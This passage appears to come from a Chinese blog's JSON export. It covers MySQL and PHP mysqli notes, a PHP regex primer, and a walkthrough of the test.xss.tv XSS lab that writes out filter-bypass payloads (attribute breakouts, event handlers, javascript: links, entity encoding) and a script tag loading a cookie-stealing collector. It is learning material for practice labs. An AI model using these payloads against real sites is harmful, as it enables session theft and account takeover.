in后面的子语句必须只返回一个字段​若查询结果唯一(只有一条)可以使用=代替in not in​与in相反​exists​语法：select语句 where exists(select 语句);​exists：后面那个子语句有没有查询出记录来，如果查询出记录来返回true,否则就是false​并且查询出来的记录的具体的值是NULL也是没有关系,也是返回true.​not exits​与exists相反​ 1)select * from 表1 where 表2 in(select 表2 from 字段名);​ 2)若查询结果唯一可以使用=代替in​ select * from 表1 where 表2=(select 表2 from 字段名 limit 1);7&gt;记录联合我们常常会碰到需要将两个表或者多个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示这是就需要用到记录联合多个select 语句用UNION或者UNION ALL隔开即可实现 例： mysql&gt; select id,name from user union select id,sex from student; +----+-------+ | id | name | +----+-------+ | 1 | ad | | 2 | admin | | 3 | root | | 4 | wang | | 1 | wa | | 2 | me | | 3 | ng | +----+-------+ 7 rows in set (0.00 sec) 区别： 前者 会将多个查询结果合并后并且进行去除重复后返回​ 后者 则直接合并并不去除重复联合的条件：查询的列个数要相等 四、MySQL数据库字符编码1、字符编码概述 从本质上来说，计算机只能识别二进制代码，因此，不论是计算机程序还是其他被处理的数据，最终都必须转换成二进制，计算机才能认识。为了使计算机不仅能做科学计算，也能处理文字信息，人们想出了给每个文字符号编码以便于计算机识别处理，这就是计算机字符集的由来。 简单的说字符集就是一套文字符号及编码、比较规则的集合。 2、汉字常见字符集 1.GB2312-80:即GB2312，是中华人民共和国国家标准简体中文字符集，全称《信息交换用汉字编码字符集 基本集》，1980年发布，1981年5月1日实施。GB2312编码通行于中国大陆，中国大陆几乎所有的中文系统和国际化的软件都支持GB 23122.GBK： 汉字内码扩展规范，发布于1995年，在GB2312的基础上做了扩充，且对GB2312完全兼容，但是GBK并不是一个强制性的国家标准，只是一个行业指导规范，并没有强制力，但是由于得到了微软windows95的支持而大为流行 3、国际编码UTF-8 是一种针对Unicode的可变长度字符编码，通用性很好。 4、常用字符集比较 ACSII：单字节7位编码，最早的奠定性字符集ISO-8859-1/latin1：单字节8位编码，西欧字符集GB2312-80：双字节编码，早期标准GBK：双字节编码，虽然不是国标但是支持的系统很多UTF-32：4个字节编码，UCS-4原始编码，目前很少采用UCS-2：2字节编码，windows2000内部用UCS-2UTF-16：2字节或4字节编码，Java和Windows XP/NT等内部使用UTF-16UTF-8：1~4字节编码，互联网和Unix/Linux广泛支持的Unicode字符集,UTF-8汉字编码需要使用3个字节 5、MySQL支持的字符集 1.查看所有可用的字符集show character set;或者查看information_schema.character_sets，也可以显示所有的字符集和该字符集默认的校队规则 2.MySQL的字符集包括字符集(character)和校对规则(collation)两个概念。1)字符集用来定义MySQL存储字符串的方式2)校对规则用来定义 字符串比较的方式3)字符集和校对规则是一对多的关系,一个字符集有多个校对规则供你选择!校对规则命名约定：它们以相关的字符集名开始，通常包括一个语言名，并且以 _ci(忽略大小写)、_cs(大小写敏感)或者 _bin(二元，即比较是基于字符编码的值而与language无关)结束。查看字符集的校对规则：show collation like ‘字符集前缀%’; 6、MySQL内部的字符集和校对规则设置 MySQL内部的字符集和校对规则有4个级别的默认设置:服务器级、数据库级、表级和字段级1.服务器字符集和校对规则设置1)在配置文件中设置 [mysqld] character-set-server=utf8 2)或者在启动项中指定 mysqld --character-set-server=utf8 3)或者在编译的时候指定2.数据库字符集和校对规则设置数据库的字符集和校对规则在创建数据库的时候指定，也可以在创建完数据库后通过alter database命令修改.需要注意的是如果数据库里已经有数据存在，因为修改字符集并不能将已有的数据按照新的字符集进行存放，所以不能通过修改数据库的字符集直接修改数据的内容，需要重新导出，然后修改字符编码再导入来解决！设置数据库字符集的规则如下：1)如果指定了字符集和校对规则，则使用指定的字符集和校对规则2)如果指定了字符集没有指定校对规则，则使用指定字符集的默认校对规则3)如果指定了校对规则但未指定字符集，则使用与该校对规则关联的字符集4)如果没有指定字符集和校对规则，则使用服务器字符集和校对字符集和校对规则作为数据库的字符集和校对规则 CREATE DATABASE db_name [[DEFAULT] CHARACTER SET charset_name] [[DEFAULT] COLLATE collation_name] ALTER DATABASE db_name [[DEFAULT] CHARACTER SET charset_name] [[DEFAULT] COLLATE collation_name] 查看当前数据库的字符集和校对规则： show variables like &#39;character_set_database&#39;; show variables like &#39;collation_database&#39;; 3.表字符集和校对规则设置 表的字符集和校对规则在创建表的时候指定，也可以通过alter table 命令进行修改，同样的是如果表中已经有数据那么修改字符集对原来的记录并没有影响，不会按照新的字符集进行存放！ 设置表字符集的规则如下： 1)如果指定了字符集和校对规则，则使用指定的字符集和校对规则 2)如果指定了字符集没有指定校对规则，则使用指定字符集的默认校对规则 3)如果指定了校对规则但未指定字符集，则使用与该校对规则关联的字符集 4)如果没有指定字符集和校对规则，则使用数据库字符集和校对字符集和校对规则作为表的字符集和校对规则 CREATE TABLE tbl_name (column_list) [DEFAULT CHARACTER SET charset_name [COLLATE collation_name]] ALTER TABLE tbl_name [DEFAULT CHARACTER SET charset_name] [COLLATE collation_name] 4.字段(列)字符集和校对规则 遇到这种情况概率比较小，这只是MySQL提供给我们一个灵活设置的手段 7、MySQL连接字符集设置 连接字符集设置：客户端和服务器之间交互的字符集对于客户端和服务器段的交互操作，MySQL提供了3个不同的参数：1)character_set_client：客户端来源数据使用的字符集2)character_set_connection：连接层字符集3)character_set_results：返回结果字符集知识拓展：数据在客户端和服务器之间交互的过程中字符集转换的大概过程 1) MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；2) 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，内部操作字符集的确定方法如下： 1&gt;使用每个数据字段设定的字符集； 2&gt;若上述值不存在，则使用对应数据表设定的字符集； 3&gt;若上述值不存在，则使用对应数据库设定的字符集； 4&gt;若上述值不存在，则使用服务器设定的字符集。3) 将操作结果从内部操作字符集转换为character_set_results。这3个参数设定的字符集应该相同，并且客户端使用的字符集确实是参数character_set_client的值，才可以确保用户的数据可以正确的返回且输出。查看当前设置：show variables like &#39;character_set%&#39;;修改：set names 字符集，可以同时修改3个参数的值，对本次有效也可以在配置文件中设置： [mysql] default-character-set=字符集修改CMD命令行字符集： chcp 65001 #换成utf-8代码页（设置为utf-8之后最好手动修改显示字体 ） chcp 936 #换成默认的gbk 五、MySQL中的常见运算符和常用函数常见运算符1.算数运算符 运算符 作用 + 加法 - 减法 * 乘法 /,DIV 除法，返回商 %,MOD 取余数 2.比较运算符 运算符 作用 = 等于 &lt;&gt;或!= 不等于 &lt;=&gt; 可以用于null值的比较 &lt; 小于 &lt;= 小于等于 &gt; 大于 &gt;= 大于等于 BETWEEN 存在指定范围 IN 存在于指定集合 IS NULL 为NULL IS NOT NULL 不为NULL LIKE 通配符匹配 REGEXP或RLIKE 正则表达式匹配 3.逻辑运算符 逻辑运算符又称为布尔运算符，用来确认表达式的真和假 运算符 作用 NOT或! 逻辑非 AND或&amp;&amp; 逻辑与 OR或|| 逻辑或 XOR 逻辑异或 4.运算符的优先级 在实际运行的时候，实际上很少有人能够将运算符的优先级熟练记忆 很多情况下我们都是用“()”来将需要优先的操作括起来，这样既起到了优先的作用，又使得其他用户看起来更易于理解 常用函数函数用于SQL语句中1.字符串函数CONCAT(S1,S2,…Sn) 连接S1,S2,…Sn为一个字符串INSERT(str,x,y,instr) 将字符串str从第x位置开始，y个字符长的字符串换位字符串instrLOWER(str) 将字符串str中所有字符变为小写UPPER(str) 将字符串str中所有字符变为大写LEFT(str,x) 返回字符串str最右边的x个字符RIGHT(str,x) 返回字符串str最右边的x个字符LPAD(str,n,pad) 用字符串pad对str最左边进行填充，直到长度为n个字符长度RPAD(str,n,pad) 用字符串pad对str最右边进行填充，直到长度为n个字符长度LTRIM(str) 去掉字符串str左侧的空格RTRIM(str) 去掉字符串str行尾的空格REPEAT(str,x) 返回str重复x次的结果REPLACE(str,a,b) 用字符串b替换字符串str中所有出现的字符串aSTRCMP(s1,s2) 比较字符串s1和s2TRIM(str) 去掉字符串行尾和行头的空格SUBSTRING(str,x,y) 返回从字符串str x位置起y个字符长度的字符串LENGTH(str) 返回字符串长度2.数值函数ABS(x) 返回x的绝对值CEIL(x) 返回大于x的最小整数值FLOOR(x) 返回小于x的最大整数值MOD(x,y) 返回x/y的模RAND() 返回0-1内的随机值ROUND(x,y) 返回参数x的四舍五入的有y位小数的值TRUNCATE(x,y) 返回数字x截断为y位小数的结果3.日期和时间函数CURDATE() 返回当前日期CURTIME() 返回当前时间NOW() 返回当前的日期和时间UNIX_TIMESTAMP(date) 返回日期date的UNIX时间戳FROM_UNIXTIME() 返回UNIX时间戳的日期值WEEK(date) 返回日期date为一年中的第几周YEAR(date) 返回日期date的年份HOUR(time) 返回time的小时值MINUTE(time) 返回time的分钟值MONTHNAME(date) 返回date的月份名DATE_FORMAT(date,fmt) 返回按字符串fmt格式化日期date值DATE_ADD(add,INTERVAL expr type) 返回一个日期或时间值加上一个时间间隔的时间值DATEDIFF(expr,expr2) 返回起始时间expr和结束时间expr2之间的天数4.流程函数1)IF(value,t,f) 如果value是真，返回t,否则返回f select if(field1&gt;1000,’高薪’,’低薪’);2)IFNULL(value1,value2) 如果value1不为null，返回value1，否则value1该是什么还是什么 select ifnull(name,’无名’);3)CASE WHEN [value1] THEN [result1]…ELSE[default]END 如果value1是真，返回result1，否则返回default select case when 100&gt;10 then ‘真’ else ‘假’ end; 和if语句比较像4)CASE [expr] WHEN [value1] THEN[result1]…ELSE[default]END 如果expr等于value1，返回result1，否则返回default select case 1 when 1 then ‘一’ when 2 then ‘二’ when 3 then ‘三’ else ‘未知数字’end; 和switch语句比较像5.其他常用函数 用法：select 函数名; DATABASE() 返回当前数据库名VERSION() 返回当前数据库版本USER() 返回当前登录用户名INET_ATON(IP) 返回IP地址的数字表示INET_NTOA(num) 返回数字代表的IP地址PASSWORD(str) 返回字符串str的加密版本MD5() 返回字符串str的MD5值 六、mysqli与MySQL交互1.建立、关闭与MySQL服务器的连接1)连接指定的mysql服务器 $mysqli_connect=@mysqli_connect($host, $user, $password,$database,$port);//$port端口，默认3306 2)连接错误时的提示 int mysqli_connect_errno ();//返回最后一次连接调用的错误代码 string mysqli_connect_error ();//返回一个字符串描述的最后一次连接调用的错误代码 3)设置默认字符编码 bool mysqli_set_charset ( mysqli $link , string $charset ) 4)选择特定的数据库 bool mysqli_select_db ( mysqli $link , string $dbname); 5)关闭与mysql服务器的连接 bool mysqli_close ( mysqli $link ); &lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); //与MySQL建立连接 $link=@mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;); //连接错误提示 if(mysqli_connect_errno()){ exit(mysqli_connect_errno()); } //设置默认字符编码 mysqli_set_charset($link,&#39;utf8&#39;); //选择数据库 mysqli_select_db($link,&#39;myphp&#39;); //关闭与mysql服务器的连接 mysqli_close($link); ?&gt; 2.执行SQL语句1)对数据库执行一条SQL语句1&gt; mixed mysqli_query ( mysqli $link , string $query [, int $resultmode = MYSQLI_STORE_RESULT ] ); ​ ①对于insert，update，delete等不会返回数据的SQL语句，在执行没有错误时将返回true。​ ②对于返回数据的SQL语句执行成功的时候会返回结果集对象可以使用操作结果集对象的函数来从中获取数据​ ③MYSQLI_STORE_RESULT和MYSQLI_USE_RESULT决定了mysqli client和server之间取结果集的方式。​ MYSQLI_STORE_RESULT：执行SQL时提取结果集返回给client，并分配内存，存储到用户程序空间中,之后mysqli_fetch_array()​ 相当于是从本地取数据；而MYSQLI_USE_RESULT方式下，mysqli_fetch_array()每次都要向server请求结果行。​ MYSQLI_USE_RESULT：执行SQL的时候并没有从server将结果集取回2&gt;bool mysqli_real_query ( mysqli $link , string $query );​ 也可以使用本函数对数据库执行一条SQL语句，返回结果为布尔值，不返回结果集。​ 如果想获取结果集可以使用mysqli_store_result()获取结果集对象.3&gt;如果在执行SQL语句的时候发生错误，以上两个函数都将返回false，并且可以使用以下函数处理错误原因​ int mysqli_errno ( mysqli $link );​ string mysqli_error ( mysqli $link ); //对数据库执行一条SQL语句 //$query=&#39;insert into t1(info) values(&quot;xiaoming&quot;)&#39;; $query=&#39;select*from t1&#39;; $result=mysqli_query($link,$query); 2)操作结果集对象的函数1&gt;从结果集对象中解析数据的常见函数 ①以索引数组的方式获取一条记录的数据mixed mysqli_fetch_row ( mysqli_result $result );重复使用以获取下一条记录的数据 //以索引数组的方式获取一条记录的数据 while ($data=mysqli_fetch_row($result)){ var_dump($data); } ②以关联数组的方式获取一条记录的数据array mysqli_fetch_assoc ( mysqli_result $result );重复使用以获取下一条记录的数据 //以关联数组的方式获取一条记录的数据 var_dump(mysqli_fetch_assoc($result)); var_dump(mysqli_fetch_assoc($result)); var_dump(mysqli_fetch_assoc($result)); var_dump(mysqli_fetch_assoc($result)); var_dump(mysqli_fetch_assoc($result)); ③以索引数组或关联数组的方式获取一条记录的数据mixed mysqli_fetch_array ( mysqli_result $result [, int $resulttype = MYSQLI_BOTH ] );重复使用以获取下一条记录的数据 //以索引数组或关联数组的方式获取一条记录的数据 //第二个参数可选值：MYSQLI_ASSOC, MYSQLI_NUM, MYSQLI_BOTH(默认) var_dump(mysqli_fetch_array($result,MYSQLI_NUM)); ④以索引数组或关联数组的方式获取全部记录的数据mixed mysqli_fetch_all ( mysqli_result $result [, int $resulttype = MYSQLI_NUM ] ); mysqli_fetch_all($result); ⑤返回结果集中的下一个字段信息object mysqli_fetch_field ( mysqli_result $result ); //返回结果集中的下一个字段信息 $filed=mysqli_fetch_field($result); var_dump($filed); echo $filed-&gt;orgname; //重复使用获取下一个字段 var_dump(mysqli_fetch_field($result)); var_dump(mysqli_fetch_field($result)); ⑥返回一个代表结果集字段的对象数组array mysqli_fetch_fields ( mysqli_result $result ); //返回一个代表结果集字段的对象数组 var_dump(mysqli_fetch_fields($result)); $fields=mysqli_fetch_fields($result); echo $fields[0]-&gt;name; ⑦获取结果中行的数量int mysqli_num_rows ( mysqli_result $result ); //获取结果中行的数量 var_dump(mysqli_num_rows($result)); 注意：如果使用MYSQLI_USE_RESULT模式则必须在获取完所有的结果才可使用该函数。2&gt;释放与一个结果集相关的内存返回的结果集在数据量很大的时候需要很多的内存支持，所以在操作完结果集的时候有必要立刻释放与一个结果集相关的内存， 释放之后，结果集就不可用了void mysqli_free_result ( mysqli_result $result ); //释放与一个结果集相关的内存 mysqli_free_result($result); 3)其他常用函数1&gt;获取前一个Mysql操作的受影响行数 int mysqli_affected_rows ( mysqli $link );2&gt;返回最后一次操作自动生成并使用的id mixed mysqli_insert_id ( mysqli $link );3&gt;转义用于SQL语句中的特殊字符防止SQL语句出错 string mysqli_real_escape_string ( mysqli $link , string $escapestr );4)一次性执行多条SQL语句,多个SQL语句用分号隔开 bool mysqli_multi_query ( mysqli $link , string $query ); 七、知识补充1.include语句 当一个文件被包含时，其中所包含的代码继承了 include 所在行的变量范围。从该处开始，调用文件在该行处可用的任何变量在被调用的文件中也都可用。 2.include_once语句 唯一区别是如果该文件已经被包含过，则不会再次包含。可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。 3.require语句 require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生致命错误。换句话说将导致脚本终止而 include 只产生警告信息，脚本会继续运行。 4.require_once语句 require_once 语句和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"PHP","slug":"编程开发/PHP","permalink":"https://qwzf.github.io/categories/编程开发/PHP/"}],"tags":[{"name":"MySQL学习","slug":"MySQL学习","permalink":"https://qwzf.github.io/tags/MySQL学习/"},{"name":"PHP与MySQL交互","slug":"PHP与MySQL交互","permalink":"https://qwzf.github.io/tags/PHP与MySQL交互/"}],"author":"qwzf"},{"title":"XSS漏洞攻关(一)","slug":"XSS漏洞攻关(一)","date":"2019-04-28T09:00:44.187Z","updated":"2020-08-01T16:35:10.844Z","comments":true,"path":"2019/04/28/XSS漏洞攻关(一)/","link":"","permalink":"https://qwzf.github.io/2019/04/28/XSS漏洞攻关(一)/","excerpt":"","text":"前言在了解xss之前，可以先了解一下下面这些内容 1.AJAX实现异步更新、跨域 2.常用命令document.write();``alert(&quot;&quot;);``document.cookie; 3.payload—意思为有效载荷，概念验证，即是漏洞验证脚本； Ajax跨域 1.允许单个域名访问 指定某域名跨域访问，只需在http://xx.com/xx.php文件头部添加如下代码： header(&#39;Access-Control-Allow-Origin:http://xx.com&#39;); 2.允许所有域名访问 允许所有域名跨域访问，只需在http://xx.com/xx.php文件头部添加如下代码： header(&#39;Access-Control-Allow-Origin:*&#39;); 3.允许多个域名访问 JS获取url 获取当前域名 方法一 var domain = document.domain; 方法二 var domain = window.location.host; 注意问题 由于获取到的当前域名不包括 http://，所以把获取到的域名赋给 a 标签的 href 时，别忘了加上 http://，否则单击链接时导航会出错。 其他想了解请看js获取当前域名、Url、相对路径和参数以及指定参数 Session &amp; Cookie cookie 数 据 存 放 在 客 户 的 浏 览 器 上 ， session 数 据 放 在 服 务 器 上 。 cookie 不 是 很 安 全 ， 别 人 可 以 分 析 存 放 在 本 地 的 COOKIE 并 进 行 COOKIE 欺 骗 。 考 虑 到 安 全 应 当 使 用 session 。 session 会 在 一 定 时 间 内 保 存 在 服 务 器 上 。 当 访 问 增 多 ， 会 比 较 占 用 你 服 务 器 的 性 能 考 虑 到 减 轻 服 务 器 性 能 方 面 ， 应 当 使 用 COOKIE 。 单 个 cookie 保 存 的 数 据 不 能 超 过 4K ， 很 多 浏 览 器 都 限 制 一 个 站 点 最 多 保 存 20 个 cookie 。 最大区别：一个存储在服务器端，一个存储在客户端 XSS介绍XSS攻击全称跨站脚本攻击(Cross Site Scripting)，XSS是一种在Web应用中的计算机安全漏洞，它允许恶意Web用户将代码植入到提供给其他用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。对于跨站脚本攻击，Hacker共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode” XSS攻击可能产生的危害 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 盗窃企业重要的具有商业价值的资料 非法转账 强制发送电子邮件 网站挂马 控制受害者机器向其它网站发起攻击 XSS漏洞的分类1.DOM(本地利用)型：不经过服务器，通过修改页面的DOM节点形成的XSS 这种漏洞存在于页面中客户端脚本自身 攻击过程： ​ H给U发送一个恶意构造了Web的URL，U点击并查看了这个URL。恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在U电脑上。具有漏洞的HTML页面包含了在U电脑本地域执行的JavaScript。H的恶意脚本可以在U的电脑上执行U所持有的权限下的命令。 2.存储型：经过服务器，存进数据库 ​ 该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。 攻击过程： ​ A拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。 H注意到A的站点具有存储式XXS漏洞， H发布一个热点信息，吸引其它用户纷纷阅读。 A或者是任何的其他人U浏览该信息，其会话cookies或者其它信息将被H盗走。 3.反射型：只是简单地把用户输入的数据反射给浏览器，简单来说，黑客往往需要用户诱使用户点击一个恶意链接，才能攻击成功 又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。类似存储式漏洞，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能注入到动态页面中。 攻击过程： ​ U经常浏览某个网站A。U使用用户名/密码进行登录，并存储敏感信息(比如银行帐户信息)在网站A中。 H发现A站点包含反射性的XSS漏洞，编写一利用漏洞的URL，并将其冒充为来自A的邮件给U。 U在登录到A的站点后，浏览H供的URL。嵌入到URL中的恶意脚本在U的浏览器中执行，然后在U完全不知情的情况下将这些信息发送到H的Web站点。 X-XSS-Protectionheader(&quot;X-XSS-Protection:0&quot;);//告诉服务器禁用XSS保护 header(&quot;X-XSS-Protection:1&quot;);//告诉服务器开启XSS保护 实例应用： 劫持访问 劫持访问就是在恶意脚本中插入诸如&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;的代码，那么页面就会跳转到百度首页。劫持访问在持久型和非持久型XSS中都比较常被利用。持久型XSS中劫持访问的危害不用说大家都清楚，但有人会问非持久型XSS中劫持访问有什么作用呢？很简单，试想下像qq.com，baidu.com这样的域名下出现非持久型XSS，那么在发送钓鱼链接时就可以通过qq.com等域名进行跳转，一般人一看到qq.com之类的域名警惕性会下降，也就更容易上当了。 盗用cookie实现无密码登录 由于盗取的cookie需要传回给攻击者，因此往往需要一个服务器来接收盗取的cookie，这也就是xss平台的作用了。网上的xss平台很多，但动手搭建一个也不难，建议有条件的自己搭建。 首先登录平台后台获取到js脚本地址为http://127.0.0.1/XSS/template/default.js，所以我们需要做的是把这段代码植入指定页面。 &lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/XSS/template/default.js&quot;&gt;&lt;/script&gt; 了解的差不多了，下面我开始去在线平台练习了。。。 XSS攻击常见利用方式​ 一般思路：普通注入–&gt;普通闭合注入(带&lt;input&gt;标签)–&gt;触发事件注入(特殊字符被过滤)–&gt;双关键字、大小写和超链接注入(触发事件的关键字被过滤)–&gt;HTML实体编码绕过–&gt;HTTP头流量包注入 下面都是我在在线平台上的练习。做题之后发现查看源码大法真的好。。。。 1.普通的GET型XSSLevel1 页面没有输入点，所以直接构造payload就行啦 http://test.xss.tv/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=submit 该注入能产生说明程序员没有过滤或用引号包裹任何参数内容，也就是说后台代码直接解析执行参数值。这就造成在弱类型的语言中，原本是正常的字符串被当作代码执行，形成该XSS漏洞 2.带&lt;input&gt;标签的GET型XSSLevel2查看源码，发现 所以直接用双引号闭合value，然后构造payload http://test.xss.tv/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=submit 选择在URL处直接注入代码，带&lt;input&gt;标签的GET型XSS和普通的GET型XSS最大的区别就是普通的GET型XSS的参数可以直接被解析，而带&lt;input&gt;标签的GET型XSS还需要闭合原本的input窗口，然后才能注入ShellCode 3.过滤特殊字符的GET型XSSLevel3 原先给的url是 http://test.xss.tv/level3.php?writing=wait而查看源码发现 value里并没有属性值，因为表单提交里并没有name为writing的，所以把writing改为keyword。闭合value进行普通注入 发现过滤了尖括号 ，所以带有尖括号的ShellCode不能用了。所以在此换思路采用触发事件属性： http://test.xss.tv/level3.php?keyword=&#39;onclick=&#39;javascript:alert(1)&#39;&amp;submit=submit注意：上面用的是onclick点击事件，所以还要点击一下输入框才会有弹窗 Level4 这道题和Level3的做法相同，查看源码发现，把单引号闭合value换成双引号闭合value就ok啦！ http://test.xss.tv/level3.php?keyword=&quot;onclick=&quot;javascript:alert(1)&quot;&amp;submit=submit4.过滤关键字的GET型XSS当特殊字符都被过滤了，再考虑触发事件，触发事件的关键字也被过滤了，就要找哪些还没有被过滤 Level5 先使用触发事件测试一下 http://test.xss.tv/level5.php?keyword=&quot;onclick=&quot;javascript:alert(1)&quot; 然后查看源代码 &lt;form action=level5.php method=GET&gt; &lt;input name=keyword value=&quot;&quot;o_nclick=&quot;javascript:alert(1)&quot;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt; 发现onclick关键字中间被加了下划线。然后我选择使用双关键字和大小写进行绕过，结果没有成功。显然，这种是用双关键字和大小写绕过不了的。然后，我考虑了一下超链接 http://test.xss.tv/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt; 或者 http://test.xss.tv/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;点一下&lt;/a&gt;// 然后点击下面的蓝字，就成功了。 Level6 我考虑了一下用超链接测试 http://test.xss.tv/level6.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;点一下&lt;/a&gt;// 然后查看源代码 &lt;form action=level6.php method=GET&gt; &lt;input name=keyword value=&quot;&quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;点一下&lt;/a&gt;//&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt; 发现href关键字中间被加了下划线。然后我再使用大小写进行绕过。将e大写 http://test.xss.tv/level6.php?keyword=&quot;&gt;&lt;a hrEf=&quot;javascript:alert(1)&quot;&gt;点一下&lt;/a&gt;// 然后点击蓝字就成功了。 Level7 将Level6的第二步大小写绕过，改为双写绕过就行了 http://test.xss.tv/level7.php?keyword=&quot;&gt;&lt;a hrhrefef=&quot;javascrscriptipt:alert(1)&quot;&gt;点一下&lt;/a&gt;// 5.HTML实体编码的GET型XSSHTML实体编码指的就是用unicode编码来代替关键字符或关键符号，&amp;、#、;不能被过滤。 Level8 首先我尝试在输入框里输入 javascript:alert(1) 查看源代码 &lt;form action=level8.php method=GET&gt; &lt;input name=keyword value=&quot;javascript:alert(1)&quot;&gt; &lt;input type=submit name=submit value=添加友情链接 /&gt; &lt;/form&gt; &lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt; 发现关键字javascript被加上了下划线 这里就可以选择用实体编码了，将javascript的t或script进行实体编码javascrip&amp;#116;或 java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116; 然后构造payload java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) 填入输入框，点击添加友情链接然后再点友情链接，就成功了。 HTML可以识别，执行文件的正则匹配不会成功，从而达到绕过。编码绕过的方式还有好多种，比如十六进制编码、jsfuck编码、url编码等。 Level9 Javascript会被替换为javasc_rpt,尝试用html实体编码绕过，将r编码为&amp;#x72;用Level8的payload试了下，提示链接不合法，必须要有http://关键字 于是构造payload javasc&amp;#x72;ipt:%0dhttp://www.0aa.me%0dalert(1) %0a %0d都为url编码的换行符 或 java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(&amp;#x22;http://&quot;) 6.转换参数的GET型XSSLevel10 keyword注入点，&lt;、&gt;都被过滤，几乎不能突破。查看源码发现有几个type=hidden的输入框 &lt;form id=search&gt; &lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; &lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; &lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; &lt;/form&gt; keyword参数后面输入： &amp;t_link=” type=”text” 1&amp;t_history=” type=”text” 2&amp;t_sort =” type=”text” 3 查看注入点，发现t_sort字段可以注入(也可以一个一个的查找注入点) 。然后构造payload： &amp;t_sort=&quot; type=&quot;text&quot;onmouseover=alert`1` &quot; 或onclick触发事件 https://test.xss.tv/level10.php?t_sort=4&quot; onclick=alert(1) type=&quot;text&quot;下面的几关好像需要抓包工具进行抓包，我还不怎么会，就暂且先总结这么多吧！后续补上下面的内容。 未完待续。。。。。。。。。。。。。。。。。。。。。。。。。。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"XSS","slug":"漏洞原理/XSS","permalink":"https://qwzf.github.io/categories/漏洞原理/XSS/"}],"tags":[{"name":"XSS绕过","slug":"XSS绕过","permalink":"https://qwzf.github.io/tags/XSS绕过/"},{"name":"XSS基础","slug":"XSS基础","permalink":"https://qwzf.github.io/tags/XSS基础/"}],"author":"qwzf"},{"title":"Web开发-PHP基础篇(三)","slug":"Web开发-PHP基础篇(三)","date":"2019-04-27T07:02:06.532Z","updated":"2020-08-01T15:44:18.059Z","comments":true,"path":"2019/04/27/Web开发-PHP基础篇(三)/","link":"","permalink":"https://qwzf.github.io/2019/04/27/Web开发-PHP基础篇(三)/","excerpt":"","text":"又继续学习了PHP的学习教程，正则表达式、日期与时间、图像处理、文件与目录操作和会话控制。感觉都十分重要，于是在学习中做了认真总结，总结如下 一、正则表达式1、正则表达式语法规则 ​ 描述了一类字符串的特征，然后通过这个特征可以配合一些特定的函数，来完成对字符串更加复杂的一系列操作！​ 普通字符和特殊字符组成的一个字符串 如： $a=&#39;/test/&#39;; $str=&#39;abctest123456a&#39;; var_dump(preg_match_all($a,$str,$b));//检查$str里是否有$a中的内容(test)，并匹配给$b var_dump($b); 2、定界符 ​ 我们一般习惯使用正斜线/作为定界的字符。除了字母、数字和反斜线以外的字符都可以作为定界符(# ! {} |)，前后要一致 3、普通字符 a-z、A-Z、0-9、双引号、单引号，都没有特殊的含义 4、元字符 \\d 匹配任意一个十进制数字，等价于[0-9]\\D 匹配任意一个除十进制数字以外字符,等价于[^0-9]\\s 匹配任意一个空白字符,比如换页符、换行符、回车符、制表符、垂直制表符\\S 匹配除空白字符以外的任何一个字符\\w 匹配任意一个数字或字母或下划线\\W 匹配除数字、字母、下划线以外的任意一个字符. 匹配除换行符以外的任意一个字符如： $a=&#39;/te.st/&#39;;//单纯只用&quot;.&quot;,需要用反斜线“\\”转义 $str=&#39;abcte3st123456a&#39;; var_dump(preg_match_all($a,$str,$b)); var_dump($b);//输出1 * 匹配0次、或1次、或多次其前面的字符//.*配合使用默认情况下是贪婪匹配(尽可能多的去匹配字符) + 匹配1次或多次其前面的字符 ? 匹配0次或1次其前面的字符//.*配合后面加个?懒惰匹配 {n} 表示其前面字符恰好出现n次 {n,} 表示其前面字符出现不少于n次 {n,m} 